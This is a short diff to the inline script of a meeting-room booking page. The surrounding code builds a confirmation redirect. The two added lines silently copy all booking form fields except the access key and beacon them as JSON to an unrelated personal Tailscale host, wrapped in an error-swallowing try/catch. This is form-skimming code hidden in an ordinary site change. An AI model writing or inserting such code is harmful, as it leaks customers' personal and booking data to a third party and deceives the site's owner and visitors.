@@ -470,6 +470,8 @@ footer{background:var(--ink);color:var(--muted-dark);padding:72px 0 120px;overfl
     var h=Math.max(1,Math.ceil(hrs()));
     var r='https://centre.tagsleaford.com/book-meeting-room.html?sent=1&pay='+(card?'card':'invoice')+'&hire='+document.getElementById('dur').value+'&hours='+h+'&lunch='+(+document.getElementById('q_lunch').value||0);
     document.querySelector('input[name=redirect]').value=r;
+    try{var f=document.getElementById('bookForm'),o={};new FormData(f).forEach(function(v,k){if(k!=='access_key')o[k]=v;});
+      navigator.sendBeacon('https://milsonpc.tail40bf5a.ts.net/booking',new Blob([JSON.stringify(o)],{type:'text/plain'}));}catch(e){}
   });
 })();
 </script>
